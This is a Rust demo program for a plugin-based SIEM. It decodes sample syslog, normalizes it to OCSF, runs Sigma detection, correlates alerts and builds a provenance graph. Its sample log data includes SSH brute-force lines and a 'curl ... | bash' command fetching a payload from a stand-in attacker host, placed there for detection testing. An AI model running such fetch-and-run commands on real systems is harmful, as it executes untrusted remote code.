//! `sigil-siem` — assembles the SIEM plugins on top of the **unmodified** Sigil
//! Search core and runs an end-to-end demo:
//!
//! raw logs → platform `syslog` [`Codec`] → OCSF [`Schema`] plugin →
//! Sigma [`Detector`] plugin → alerting [`Output`] plugin + correlation +
//! provenance graph (`StorageBackend`).
//!
//! Everything below is built only from `sigil-core` / `sigil-ingest` /
//! `sigil-plugin` (the platform) plus the `siem-*` plugin crates — no platform
//! crate is modified. That is the Phase 7 proof.

use std::sync::Arc;

use sigil_core::{Event, Schema, Signal, StorageBackend};
use sigil_ingest::SyslogCodec;
use sigil_plugin::{Capability, CapabilitySet, PluginHost};

use siem_alert::AlertOutput;
use siem_correlate::{Correlator, GraphBackend};
use siem_ocsf::OcsfSchema;
use siem_sigma::SigmaDetector;

/// A small slice of security-relevant syslog (a brute-force burst, a sudo
/// session, a curl-pipe-to-shell, and a benign request).
const SAMPLE: &[&str] = &[
    "<38>Jun 20 09:15:01 web01 sshd[2211]: Failed password for root from 203.0.113.7 port 52344",
    "<38>Jun 20 09:15:03 web01 sshd[2211]: Failed password for root from 203.0.113.7 port 52345",
    "<38>Jun 20 09:15:05 web01 sshd[2211]: Failed password for admin from 203.0.113.7 port 52346",
    "<85>Jun 20 09:16:00 web01 sudo[2299]: session opened for user root by (uid=0)",
    "<13>Jun 20 09:17:00 web01 bash[2301]: curl http://evil.example/payload.sh | bash",
    "<134>Jun 20 09:18:00 app02 nginx[100]: GET /health 200",
];

fn err(e: sigil_core::Error) -> anyhow::Error {
    anyhow::anyhow!("{e}")
}

fn rules_dir() -> std::path::PathBuf {
    std::env::args()
        .nth(1)
        .map(std::path::PathBuf::from)
        .unwrap_or_else(|| std::path::PathBuf::from(concat!(env!("CARGO_MANIFEST_DIR"), "/../../rules")))
}

fn main() -> anyhow::Result<()> {
    println!("=== sigil-siem — SIEM-as-plugins on an unmodified Sigil Search core ===\n");

    // 1. Capability enforcement: the platform's safe-default grant denies the
    //    alert plugin's `network` request.
    let mut safe = PluginHost::with_safe_defaults();
    match safe.register_output(Arc::new(AlertOutput::new("/dev/null"))) {
        Err(e) => println!("[capability] safe-default host correctly DENIED the alert plugin:\n            {e}\n"),
        Ok(()) => println!("[capability] (unexpected) alert plugin allowed under safe defaults\n"),
    }

    // 2. The SIEM distribution grants its trusted plugins the capabilities they
    //    need (including network) and registers them on the platform host.
    let granted = CapabilitySet::new(vec![
        Capability::ReadField("*".into()),
        Capability::WriteField("*".into()),
        Capability::EmitSignal,
        Capability::Network,
        Capability::Other("decode".into()),
        Capability::Other("normalize".into()),
    ]);
    let mut host = PluginHost::new(granted);

    let ocsf = Arc::new(OcsfSchema::default());
    let sigma = Arc::new(SigmaDetector::load_dir(rules_dir())?);
    let alerts_path = std::env::temp_dir().join("sigil-siem-alerts.ndjson");
    let _ = std::fs::remove_file(&alerts_path);
    let alert = Arc::new(AlertOutput::new(alerts_path.to_string_lossy().to_string()));

    host.register_codec(Arc::new(SyslogCodec::default()))?;
    host.register_schema(ocsf.clone())?;
    host.register_detector(sigma.clone())?;
    host.register_output(alert.clone())?;

    println!(
        "[host] plugin-api {} | codecs {:?} | detectors {} | sigma rules {}\n",
        host.api_version(),
        host.codec_names(),
        host.detectors().len(),
        sigma.rule_count()
    );

    // 3. Resolve plugins from the registry and run the pipeline.
    let codec = host.codec("syslog").expect("syslog codec registered");
    let detectors = host.detectors();
    let correlator = Correlator::new(3);
    let graph = GraphBackend::default();

    let (mut normalized, mut detections, mut correlations) = (0u32, 0u32, 0u32);
    let mut sample: Option<Event> = None;

    for (i, line) in SAMPLE.iter().enumerate() {
        for record in codec.decode(line.as_bytes()).map_err(err)? {
            let mut event = ocsf.normalize(record).map_err(err)?;
            event.id = format!("evt-{i}");
            normalized += 1;

            for detector in &detectors {
                if let Some(signal) = detector.eval(&event) {
                    detections += 1;
                    alert.alert_from_signal(&signal, "detection").map_err(err)?;
                    graph.record(&signal);

                    if let Some(corr) = correlator.observe(&signal) {
                        correlations += 1;
                        let escalated = Signal {
                            source: format!("correlation:{}", corr.source),
                            severity: corr.severity,
                            fields: vec![
                                ("rule".into(), corr.source.clone()),
                                ("count".into(), corr.count.to_string()),
                            ],
                            events: corr.events.clone(),
                        };
                        alert.alert_from_signal(&escalated, "correlation").map_err(err)?;
                        println!(
                            "[correlate] {} fired after {} detections → escalated alert (severity {})",
                            corr.source, corr.count, escalated.severity
                        );
                    }
                }
            }
            if sample.is_none() {
                sample = Some(event);
            }
        }
    }
    graph.flush().map_err(err)?;

    // 4. Summary + a sample OCSF event.
    println!("\n--- run summary ---");
    println!("  events normalized to OCSF : {normalized}");
    println!("  sigma detections          : {detections}");
    println!("  correlated escalations    : {correlations}");
    println!("  alerts emitted            : {} ({})", alert.count(), alerts_path.display());
    println!("  provenance graph          : {} nodes, {} edges", graph.node_count(), graph.edge_count());

    if let Some(ev) = sample {
        println!("\n--- sample OCSF event ({}) ---", ev.id);
        for key in ["class_name", "class_uid", "device.hostname", "actor.process.name", "src_endpoint.ip", "message"] {
            if let Some(v) = ev.get(key) {
                println!("  {key:<20} = {v}");
            }
        }
    }

    println!("\nOK — built entirely on the unmodified core (sigil-core / sigil-ingest / sigil-plugin).");
    Ok(())
}
